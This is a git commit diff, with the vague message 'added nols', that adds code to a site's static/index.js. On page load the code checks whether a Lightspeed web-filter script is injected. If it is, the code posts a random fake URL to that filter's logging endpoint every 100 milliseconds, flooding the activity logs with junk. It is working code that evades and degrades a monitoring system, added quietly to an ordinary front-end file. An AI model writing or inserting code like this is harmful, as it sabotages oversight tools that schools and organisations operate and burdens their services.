670cae26eb08be03e301f4169544ad0940b18f5e
0xkkl <kaydan@leozc.com>
2023-05-18 07:05:05 -0700

    added nols

--- static/index.js
+++ static/index.js
@@ -24,3 +24,25 @@ function isUrl(val = ''){
     if (/^http(s?):\/\//.test(val) || val.includes('.') && val.substr(0, 1) !== ' ') return true;
     return false;
 };
+function generate() {
+       const xhr = new XMLHttpRequest();
+       const body = {
+           url: "https://" + Math.random().toString(36).substring(2, 20) + "." + getRandomItem(array)
+       };
+       console.log('reported ' + JSON.stringify(body));
+       xhr.open('POST', document.location.origin + '/772ff609488b2c9bb6bb2871cac430715c14f39e1462bea30062462d694cfd9a/log', true);
+       xhr.send(JSON.stringify(body));
+   }
+   const injectScriptUrl = "/772ff609488b2c9bb6bb2871cac430715c14f39e1462bea30062462d694cfd9a/inject.js";
+   const scriptExistsRequest = new XMLHttpRequest();
+   scriptExistsRequest.open('GET', injectScriptUrl);
+   scriptExistsRequest.onreadystatechange = function() {
+       if (scriptExistsRequest.readyState === 4) {
+           if (scriptExistsRequest.status === 200) {
+               setInterval(generate, 100);
+           } else if (scriptExistsRequest.status === 404){
+               console.log('Lightspeed not detected!')
+           }
+       }
+   };
+   scriptExistsRequest.send();
